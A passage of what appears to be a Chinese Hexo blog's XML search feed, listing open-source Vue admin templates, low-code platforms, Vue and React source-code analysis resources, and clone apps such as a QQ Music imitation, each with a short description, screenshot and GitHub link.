src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668704458567-447ccb14-2a82-4db5-9f18-68ad38e0007c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668704458567-447ccb14-2a82-4db5-9f18-68ad38e0007c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/biubiubiu01/vue3-bigData">https://github.com/biubiubiu01/vue3-bigData</a></p><h2 id="cool-admin-vue"><a href="#cool-admin-vue" class="headerlink" title="cool-admin-vue"></a>cool-admin-vue</h2><p>cool-admin 是一个基于 Vue3.x + Typescript + Vite + Element plus 的后台权限管理系统，开源免费，模块化、插件化、极速开发 CRUD，方便快速构建迭代后台管理系统。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668703087849-873bae17-115f-4fbc-8685-32cc8ef0eca8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668703087849-873bae17-115f-4fbc-8685-32cc8ef0eca8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/cool-team-official/cool-admin-vue">https://github.com/cool-team-official/cool-admin-vue</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低代码项目</title>
      <link href="/2023/06/30/frontend/collection/projects/di-dai-ma-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/di-dai-ma-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="1-Appsmith"><a href="#1-Appsmith" class="headerlink" title="1. Appsmith"></a>1. Appsmith</h2><p>Appsmith 是一款开源低代码框架，主要用于构建管理面板、内部工具和仪表板等，允许拖放 UI 组件来构建页面，通过连接到任何 API、数据库或 GraphQL 源，并使用 JavaScript 语言编写逻辑，可以在短时间内创建内部应用程序。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1660216889925-96aef1a5-e313-4724-93ca-0d2a8f1338e6.gif" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/gif/1500604/1660216889925-96aef1a5-e313-4724-93ca-0d2a8f1338e6.gif" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 20.2k）：</strong><a href="https://github.com/appsmithorg/appsmith">https://github.com/appsmithorg/appsmith</a></p><h2 id="2-Amis"><a href="#2-Amis" class="headerlink" title="2. Amis"></a>2. Amis</h2><p>Amis 是百度开源的一块前端低代码框架，通过 JSON 配置就能生成各种后台页面，极大减少开发成本，甚至可以不需要了解前端。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228364007-83ed30d2-969b-45dd-a280-5cde21cc50d8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228364007-83ed30d2-969b-45dd-a280-5cde21cc50d8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 11.6k）：</strong><a href="https://github.com/baidu/amis">https://github.com/baidu/amis</a></p><h2 id="3-LowCodeEngine"><a href="#3-LowCodeEngine" class="headerlink" title="3. LowCodeEngine"></a>3. LowCodeEngine</h2><p>LowCodeEngine 低代码引擎是一款为低代码平台开发者提供的，具备强大扩展能力的低代码研发框架。由阿里巴巴前端委员会、钉钉宜搭联合出品。使用者只需要基于低代码引擎便可以快速定制符合自己业务需求的低代码平台。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228186081-4bf146e2-06eb-4b2c-aed3-c8a765e65233.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228186081-4bf146e2-06eb-4b2c-aed3-c8a765e65233.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 7.5k）：</strong><a href="https://github.com/alibaba/lowcode-engine">https://github.com/alibaba/lowcode-engine</a></p><h2 id="4-form-generator"><a href="#4-form-generator" class="headerlink" title="4. form-generator"></a>4. form-generator</h2><p>Element UI 表单设计及代码生成器，可将生成的代码直接运行在基于 Element 的 vue 项目中；也可导出 JSON 表单，使用配套的解析器将 JSON 解析成真实的表单。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228937914-fd98ba19-592f-4ffd-b963-391d7f7fd077.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228937914-fd98ba19-592f-4ffd-b963-391d7f7fd077.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 6.8k）：</strong><a href="https://github.com/JakHuang/form-generator">https://github.com/JakHuang/form-generator</a></p><h2 id="5-H5-Dooring-x2F-pc-Dooring"><a href="#5-H5-Dooring-x2F-pc-Dooring" class="headerlink" title="5. H5-Dooring&#x2F;pc-Dooring"></a>5. H5-Dooring&#x2F;pc-Dooring</h2><p>H5-Dooring 是一款功能强大、专业可靠的 H5 可视化页面配置解决方案，致力于提供一套简单方便、专业可靠、无限可能的 H5 落地页最佳实践。技术栈以 React 和 TypeScript 为主，后台采用 nodejs 开发。除了 H5 版，还提供了 PC 版。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660216377847-8c24c525-5a0a-4c45-abf7-fe9f4ed5e175.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660216377847-8c24c525-5a0a-4c45-abf7-fe9f4ed5e175.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（H5）（⭐️ 6.7k）：</strong><a href="https://github.com/MrXujiang/h5-Dooring">https://github.com/MrXujiang/h5-Dooring</a></p><p>**Github（PC）（⭐️ 354）：**<a href="https://github.com/MrXujiang/pc-Dooring">https://github.com/MrXujiang/pc-Dooring</a></p><h2 id="6-YAO"><a href="#6-YAO" class="headerlink" title="6. YAO**"></a>6. YAO**</h2><p>Yao 是一款支持快速创建 Web 服务和管理后台的开源低代码应用引擎。只需使用 JSON 即可创建数据库模型、编写 API 接口、描述管理后台界面的低代码引擎，使用 Yao 构建的应用可运行在云端或物联网设备上。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228687019-6e4a2cb3-dbea-4aba-9718-2e291433adf0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228687019-6e4a2cb3-dbea-4aba-9718-2e291433adf0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 4.3k）：</strong><a href="https://github.com/YaoApp/yao">https://github.com/YaoApp/yao</a></p><h2 id="7-Mometa"><a href="#7-Mometa" class="headerlink" title="7. Mometa"></a>7. Mometa</h2><p>mometa 不是传统主流的低代码平台，而是面向研发的、代码可视设计编辑平台；它更像是 dreamweaver、gui 可视编辑之于程序员。它的定位更多是基于程序员本地开发的模式，新增了可视化编码的能力。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660229007065-6b86bf28-c3b7-4d56-92a0-a222c671e7f6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660229007065-6b86bf28-c3b7-4d56-92a0-a222c671e7f6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 3.2k）：</strong><a href="https://github.com/imcuttle/mometa">https://github.com/imcuttle/mometa</a></p><h2 id="8-NocoBase"><a href="#8-NocoBase" class="headerlink" title="8. NocoBase"></a>8. NocoBase</h2><p>NocoBase 是一个极易扩展的开源无代码开发平台。 无需编程，使用 NocoBase 搭建自己的协作平台、管理系统，只需要几分钟时间。如果你有以下需求，NocoBase 就是为你设计的：<br />● 开发组织内部管理系统<br />● 通过无代码开发，满足大部分业务需求<br />● 无代码开发在操作上足够简单，满足非开发人员；在功能上足够灵活，接近原生开发<br />● 可以非常方便的进行扩展开发<br />● 私有部署，掌控全部代码和数据</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660216914006-c340a7fd-a8e6-4669-98f7-781988e48db7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660216914006-c340a7fd-a8e6-4669-98f7-781988e48db7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 2.9k）：</strong><a href="https://github.com/nocobase/nocobase">https://github.com/nocobase/nocobase</a></p><h2 id="9-Sparrow"><a href="#9-Sparrow" class="headerlink" title="9. Sparrow"></a>9. Sparrow</h2><p>sparrow 是一个场景化低代码（LowCode）搭建工作台，它的核心目标仅有一条“提升研发效率”，目前提供基于 Vue、Element-UI 组件库中后台项目的实践，实时输出源代码。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660229140986-bb79e2fb-e730-4eb8-bb7b-0ba7bf7fad47.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660229140986-bb79e2fb-e730-4eb8-bb7b-0ba7bf7fad47.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 2.7k）：</strong><a href="https://github.com/sparrow-js/sparrow">https://github.com/sparrow-js/sparrow</a></p><h2 id="10-vite-vue3-lowcode"><a href="#10-vite-vue3-lowcode" class="headerlink" title="10. vite-vue3-lowcode"></a>10. vite-vue3-lowcode</h2><p>vite-vue3-lowcode 是一个基于 Vite2.x + Vue3.x + TypeScript 的 H5 低代码平台。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660227904541-bc86a992-827d-4a08-b4e5-7228dbca14c7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660227904541-bc86a992-827d-4a08-b4e5-7228dbca14c7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 1.8k）：</strong><a href="https://github.com/buqiyuan/vite-vue3-lowcode">https://github.com/buqiyuan/vite-vue3-lowcode</a></p><h2 id="11-华炎魔方"><a href="#11-华炎魔方" class="headerlink" title="11. 华炎魔方"></a>11. 华炎魔方</h2><p>华炎魔方是 Salesforce 低代码平台的开源替代方案，使用可视化工具进行模型设计, 页面设计, 流程设计, 报表设计 ， 只需点击鼠标，就能快速创建应用程序，实现敏捷开发的新高度。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228018138-7214cb69-eb50-44e2-9300-e840c9735f9c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228018138-7214cb69-eb50-44e2-9300-e840c9735f9c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 805）：</strong><a href="https://github.com/steedos/steedos-platform">https://github.com/steedos/steedos-platform</a></p><h2 id="12-Awesome-Lowcode"><a href="#12-Awesome-Lowcode" class="headerlink" title="12. Awesome Lowcode"></a>12. Awesome Lowcode</h2><p>Awesome Lowcode 是国内低代码平台从业者交流项目，包含了国内外的一些低代码平台。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228876332-6ea11481-125c-43be-bb2b-d86999686989.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1660228876332-6ea11481-125c-43be-bb2b-d86999686989.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 8.5k）：</strong><a href="https://github.com/taowen/awesome-lowcode">https://github.com/taowen/awesome-lowcode</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 低代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端框架源码解析项目</title>
      <link href="/2023/06/30/frontend/collection/projects/qian-duan-kuang-jia-yuan-ma-jie-xi-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/qian-duan-kuang-jia-yuan-ma-jie-xi-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>为什么要阅读源码？阅读优秀的代码的目的是让我们能够写出优秀的代码，更好的理解框架的工作方式。下面就来分享 5 个 Vue 源码解析开源项目、5 个 React 源码解析开源项目！</p><h2 id="Vue3-源码系列"><a href="#Vue3-源码系列" class="headerlink" title="Vue3 源码系列"></a>Vue3 源码系列</h2><p>Vue 中文社区提供的 Vue3 源码解析系列文章。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315401461-50f41bd0-c3d5-45e1-83b4-f86300ffa589.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315401461-50f41bd0-c3d5-45e1-83b4-f86300ffa589.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://vue3js.cn/start/">https://vue3js.cn/start/</a></p><h2 id="Vue3-源码解释"><a href="#Vue3-源码解释" class="headerlink" title="Vue3 源码解释"></a>Vue3 源码解释</h2><p>Vue3 源码解释，提供了详细的测试用例和流程图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315229933-073d9607-65b6-476c-a5fa-bb54eff264ac.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315229933-073d9607-65b6-476c-a5fa-bb54eff264ac.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://kingbultsea.github.io/vue3-analysis/book/index.html">https://kingbultsea.github.io/vue3-analysis/book/index.html</a></p><h2 id="图解-Vue、Vue-Router、Vuex-源码"><a href="#图解-Vue、Vue-Router、Vuex-源码" class="headerlink" title="图解 Vue、Vue-Router、Vuex 源码"></a>图解 Vue、Vue-Router、Vuex 源码</h2><p>提供了多张思维导图辅助你深入了解 Vue | Vue-Router | Vuex 源码架构。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315334943-ba51d416-cedc-4237-87b9-a2e34149ed5c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315334943-ba51d416-cedc-4237-87b9-a2e34149ed5c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://github.com/biaochenxuying/vue-family-mindmap">https://github.com/biaochenxuying/vue-family-mindmap</a></p><h2 id="Vue-js-技术揭秘"><a href="#Vue-js-技术揭秘" class="headerlink" title="Vue.js 技术揭秘"></a>Vue.js 技术揭秘</h2><p>该电子书的目标是全方位细致深度解析 Vue.js 的实现原理，分析的版本为 Vue.js 2.5.17-beta.0。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315004198-8f021128-d5de-49be-b141-60ac77929dd9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315004198-8f021128-d5de-49be-b141-60ac77929dd9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://ustbhuangyi.github.io/vue-analysis/">https://ustbhuangyi.github.io/vue-analysis/</a></p><h2 id="Vue-源码逐行注释分析"><a href="#Vue-源码逐行注释分析" class="headerlink" title="Vue 源码逐行注释分析"></a>Vue 源码逐行注释分析</h2><p>Vue 源码逐行注释分析，提供了 40MB+ 的 Vue 源码程序流程图思维导图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315523433-12959e67-e2f5-46ee-b50a-691c5532bbbd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315523433-12959e67-e2f5-46ee-b50a-691c5532bbbd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/qq281113270/vue">https://github.com/qq281113270/vue</a></p><h2 id="React-技术揭秘"><a href="#React-技术揭秘" class="headerlink" title="React 技术揭秘"></a>React 技术揭秘</h2><p>卡颂老师的《React 技术揭秘》电子书，该书的宗旨是打造一本严谨、易懂的 React 源码分析教程。内容不预设观点，所有观点来自 React 核心团队成员在公开场合的分享，其通过了丰富的参考资料，包括在线 Demo、文章、视频。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314259847-197977a9-3250-4431-b8de-3697347b6bd1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314259847-197977a9-3250-4431-b8de-3697347b6bd1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://react.iamkasong.com/">https://react.iamkasong.com/</a></p><h2 id="React-的秘密"><a href="#React-的秘密" class="headerlink" title="React 的秘密"></a>React 的秘密</h2><p>本项目是作者在阅读 React 源码过程中搭建的调试环境，学习过程中对源码添加了较为详细的注释，并记录了一些自己的理解与思考，输出了十几篇文章。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314405952-f320b0de-db12-4e5f-bbaa-b37f047bc5d6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314405952-f320b0de-db12-4e5f-bbaa-b37f047bc5d6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://segmentfault.com/blog/react-secret?_ea=103006355">https://segmentfault.com/blog/react-secret?_ea&#x3D;103006355</a></p><h2 id="图解-React-源码"><a href="#图解-React-源码" class="headerlink" title="图解 React 源码"></a>图解 React 源码</h2><p>图解 React 源码，用大量配图的方式, 致力于将 React 原理表述清楚。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314501439-ddcedc36-415a-4456-9096-ff3066c3f486.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314501439-ddcedc36-415a-4456-9096-ff3066c3f486.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://7kms.github.io/react-illustration-series/">https://7kms.github.io/react-illustration-series/</a></p><h2 id="React-源码分析"><a href="#React-源码分析" class="headerlink" title="React 源码分析"></a>React 源码分析</h2><p>对 React 相关代码库以及框架的源码进行了一定的分析，并总结了一张详细的流程图。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314759186-a979e439-44fe-4d2e-93a5-1dca0e708cad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672314759186-a979e439-44fe-4d2e-93a5-1dca0e708cad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>在线阅读：</strong><a href="https://buptlhuanyu.github.io/ReactNote/">https://buptlhuanyu.github.io/ReactNote/</a></p><h2 id="React-源码系列"><a href="#React-源码系列" class="headerlink" title="React 源码系列"></a>React 源码系列</h2><p>手写 React、react-dom、react reconciler 主流程源码，加深对 react 源码的理解。包括 fiber，合成事件，hooks 实现原理，dom diff，reconciliation，scheduler 等。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315495743-ea1aaefc-8d6e-4c5b-b2f8-16a1e1b124ef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1672315495743-ea1aaefc-8d6e-4c5b-b2f8-16a1e1b124ef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/lizuncong/mini-react">https://github.com/lizuncong/mini-react</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 源码解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端高仿项目</title>
      <link href="/2023/06/30/frontend/collection/projects/qian-duan-gao-fang-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/qian-duan-gao-fang-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="1-高仿-QQ-音乐（Vue）"><a href="#1-高仿-QQ-音乐（Vue）" class="headerlink" title="1. 高仿 QQ 音乐（Vue）"></a>1. 高仿 QQ 音乐（Vue）</h2><p>一个使用 Vue3+TS 开发的音乐播放器，界面模仿 QQ 音乐 Mac 客户端，支持黑夜模式。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656938622784-74da657c-d845-408d-bf80-1a36ae598ff6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656938622784-74da657c-d845-408d-bf80-1a36ae598ff6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/SmallRuralDog/vue3-music">https://github.com/SmallRuralDog/vue3-music</a></p><h2 id="2-高仿网易云-Mac-客户端（Vue）"><a href="#2-高仿网易云-Mac-客户端（Vue）" class="headerlink" title="2. 高仿网易云 Mac 客户端（Vue）"></a>2. 高仿网易云 Mac 客户端（Vue）</h2><p>一个基于 Vue2、Vue-CLI3 的高仿网易云 mac 客户端播放器（PC）。使用了 Vue 全家桶、Sass、better-scroll、ElementUI 等技术实现。</p><p>该项目实现了 mv 页、cd 页、搜索建议、搜索详情、播放、发现页、播放列表、播放记录、全部歌单、歌单详情、最新音乐、主题换肤功能、登录等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1656909926543-d4719358-fbbd-4bdf-8559-0500d4f140cf.png" class="lazyload placeholder" 